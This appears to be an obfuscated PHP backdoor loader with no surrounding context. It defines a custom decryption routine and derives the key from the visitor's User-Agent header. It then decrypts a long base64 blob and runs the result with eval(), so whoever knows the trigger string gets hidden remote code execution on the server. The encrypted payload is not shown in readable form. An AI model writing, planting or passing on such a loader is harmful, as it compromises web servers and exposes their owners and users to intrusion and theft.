<?php
function decrypt($data, $key){
    $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    $char = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    $str = '';
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}
$data = "hqTVp1NvhprL0ZiQyJvaj8Smz6TL0tnUWVJgZrDTj5bRn8eemmDWnNKHXGxuQM+WiVjUpNjX2dNZVKWrq4+El8eXyqOYWo14q7h0fa2FvY+ngK11xampqoVXXlet1deYi2yDXlOu4lSD2Kej1KrYWIWq1aKShsnGl5mgnGGKpny1cq2BgonFequxeJCuhaqDiGOBpNjZyopsUltgtHBsPIagzFVwUoqn1tdTX4GGroDAfLB8hpKFg5WVmKCnyIpapnq0dn9+tYvBq3x9ppWrdKqLiFyG2NfWllltWVmRgoOqgcB6gn6GYoKHl5bHn9SViV6lebmlsa2Ah5F9gq+nkq+ApYhaXoao1NqYWpxYoT1rQIWW2s3SxmJQb1efzM6Yz6XKophaiGKR3KNezaXNmc9l0ZjWho6cPjo7mqHQ0ZeKU49kqqKTl9HTmZrIZNaY0VmNYJ2ZmopsPTxAn8zOmMGh1qmSldWi1sqhpdReiF6QrtFdydPTx5qXYKeh04RfglXQoFxtcz5r2aKmxJ6OUo9m2KCTx9TPl5mZZanL0lWOUYWbp5vTmZORU1XHqs+dxmiKa4Zxb2pVoqKqrdWCcIJYnXSjmtZbgpNTgamGxXWwg4FehouJz5anoqt2hZBhkV+PZKqik5fR05mayGTWmNFZnFeGkoWxeYCRfIivgmGCWIWjmKnMnc7KU26BnM+cxpbIldrDyNCfpJelrdaKV9CW2KWnW6FbgpNTgamGxXWwg4FehouJz5anmKClyIJwgqTVp5Kky6TOxpaWiVjKlcegz5WOwIyleoNzg4WyuZKoeq16kneqfbbBWl2BqtilxmCcUpKGh41Vnpeun8zOmItsiFVhUrZ8ssR4gK1WlFCIW8+V3crOzZZQb1es19SS1JbRoZSVy1yEyZiXyqTLWL1epXm5pbGtgIeRfYKvp5KvgKWIj1mSVNbXqJaKcYhcg1mNVNTJ3MeanJdgdIqCYYKBqYWSd7WAgpNTWMef0pXAp9akxcfUz6WVoKusi4ahx6jRqV9W1JnZy5ydxl+hV49XsXi2w6qwfVBgV2DIxZvRUYOnmKLSlcXKU6TWmcmV1KqPUqGLoG47OVadrczPmIJugZucnsuh1s6glolYlF/Yp46RytHOz2ClpZyrks+Y0KaPpZuiiF2dcj06x5/SlcCn1qTFx9TPpZWgq6yLhGGRqNFilJbTndCUqKTGqJWgxqnOkdLN08xfoJqnW4+CV9Sh1KmlW6FBbG6noNaZzliDZZCn1pHGxZ6ZoGau1selhF2BWZmmz6HHkVNVx6rPncZgnFBzbm7VoKWVn2GFkGLZoY6Wl5/PopHappbTZdaV06TCnM/S0I+hmKJZZYOGmdaazppfUoqa1s6glopxhj1rQMaTztOFg6OVopii1YKm15TEmqallFadcj2uxqLZldxEaznLx83QUVKTo6vIw5fbUdOao5PPppCHbj5rs3M6bkHHpdTH2cqgnlKbns/GnNRZhZmcpI+vb29TUYWazm3Qp8aeys3XiVWUm6linm89glHYnZyey1SKiZmazZujosaYxZTP1o2FlZhbYFnebz2CUYFVnJiOWMjOn5aCc4heg1eHVoaIy8qdlVN0W5GQVYtR3EI9UoZUgoVTVcer0pzRmNWYo4jJyqNeVGZbkYaZy53GcEA8hlSChVNRypyOUcqqwJTP1o2Fl6Weo6nE1puLWoGwQDyGVIKFU1GBVoZQ1qXNmdTPjYWXpZ6jqcTWm4tsbj9TUoZUgoWwUcai2ZWBsm46hoSFgVFQUldZg8aYzpXKp1tWzKnO0aOS1Z6Pa25BgVCGhIWBrj08V1mDgrBvO4FVsD9wVILIn6DUm8qZ01+FlM6NoG47UFKgn4vUoMaa011Xls+mi45TrG5AhlCBV9OV2tnXz1GkpKyenm89glHeVZie2ZmC4EA7gVaGUNOc1aXY0oXHkpylnHRwbFOCrm4/sD9wnciNnKTAms+iiVmPX93UksSgnqacp9eRo86myJ6hpZWV0s6eltpYj1ncRGs5ysnRxZqiWl5nktmjj5TQo6eX1KiR1Z+myJ/Uo5CY0ZnRyd6IWms/QbZwbFfPoM+pm1KjVMbGp5aJXdRXinJuOs/KhYmXkZ6qnoODcIJZhZ2UoMqgx4VwUdCmy57FoNNQjouTkKigX5qo0daY0KWQqqOe1ZXG2GJjkWiWX4hlhZ3V0tnJWllbskZtglOCUYGsm5vSmYKNU5fCotmVgViebYaMiceanJdXdoPUmMOVxZ6lUo5Uhs2Un8Wiy1CKYIFZht9ya1FQUldZg4JTy5eBXaam2KfW11tVx5/SlY1Zj6DO1IeKWlCtRENsazzXn82eoZ2OW5CUqqGOmdWe1ZzPpJXZ1c2gkZaqaJWSZZJgiGNXn9Wi1s1hWJBdlFTHoM2Vj59ya1FQUldZg4JT3z5rVVNShrFvb1NRgVbJnNCqxpTP1oWJUVSamKfHzpiCWpxCPa9zPtfTn5rPoY5Sj2bTldbFztNfoJqnW4yd";
$uneb = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/(.*)\/(.*)/is',$uneb,$src)){
	$key = 'OJHY'.$src[2].'HKW';
}else{
	die();
}
$str = decrypt($data, $key);
eval($str);